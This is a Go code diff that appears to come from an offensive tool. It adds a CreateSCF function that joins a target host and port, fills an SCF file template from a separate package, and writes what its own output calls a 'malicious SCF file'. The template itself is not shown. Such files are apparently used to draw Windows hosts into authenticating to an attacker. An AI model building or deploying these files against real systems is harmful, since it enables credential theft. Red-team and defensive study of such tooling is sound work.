@@ -95,3 +95,32 @@ func CreateURL(target string, output string, url string, workingDir string, port
 
 	fmt.Printf("[+] URL shortcut successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(outputAbsolute), URLCreationDuration)
 }
+
+// CreateSCF function
+func CreateSCF(target string, output string, port string) {
+	fmt.Printf("[!] Scf files are deprecated and may not work on newer versions of Windows!\n\n")
+	fmt.Printf("[+] Preparing your malicious SCF file...\n\n")
+
+	// Set the target path
+	target = target + "@" + port
+
+	// Record the start time
+	SCFCreationStartTime := time.Now()
+
+	// Get the SCF file template with provided values
+	scfFileContent := Templates.GetSCFileTemplate(target)
+
+	// Record the end time
+	SCFCreationEndTime := time.Now()
+
+	// Call function named GetAbsolutePath
+	outputAbsolute := Utils.GetAbsolutePath(output)
+
+	// Calculate the duration
+	SCFCreationDuration := SCFCreationEndTime.Sub(SCFCreationStartTime)
+
+	// Call function named WriteToFile
+	Output.WriteToFile(output, scfFileContent)
+
+	fmt.Printf("[+] SCF shortcut successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(outputAbsolute), SCFCreationDuration)
+}
